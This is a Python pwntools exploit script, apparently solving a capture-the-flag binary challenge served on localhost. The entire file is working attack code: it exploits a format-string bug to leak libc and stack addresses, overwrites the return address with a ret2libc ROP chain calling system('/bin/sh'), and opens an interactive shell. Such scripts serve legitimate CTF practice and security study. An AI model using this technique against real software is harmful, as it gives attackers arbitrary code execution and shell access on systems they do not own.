from pwn import *

context.binary = elf = ELF("./challenge/chal")
libc = ELF("./challenge/libc.so.6")

OFFSET = 6

# p = elf.process()
p = remote("localhost", 5000)
assert p

def recv_addr():
    return int(p.recvline().decode().split(" ")[-1][:-2], 16)

def leak_addr(addr):
    p.sendlineafter(b'name:', b'%7$sAAAA' + p64(addr))
    return u64(p.recvline().split(b"AAAA")[0].split(b" ")[2].ljust(8, b'\x00'))

def write_to_addr(addr, value):
    payload = fmtstr_payload(OFFSET, {
        addr: value
    })

    p.sendlineafter(b'name', payload)

p.recvlines(2)

# leak libc address

p.sendlineafter(b'name', b'%47$p')

libc.address = recv_addr() - 0x29e40

log.info(f"libc @ {hex(libc.address)}")

# leak the stack

ret_addr = leak_addr(libc.symbols['environ']) - 0x130

log.info(f"ret_addr @ {hex(ret_addr)}")


# # RET2LIBC

rop = ROP(libc)
BIN_SH = next(libc.search(b'/bin/sh\x00'))
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address

write_to_addr(ret_addr, POP_RDI+1)
write_to_addr(ret_addr+8, POP_RDI)
write_to_addr(ret_addr+16, BIN_SH)
write_to_addr(ret_addr+24, libc.symbols['system'])


p.sendlineafter(b'name:', b'exit')


p.interactive()
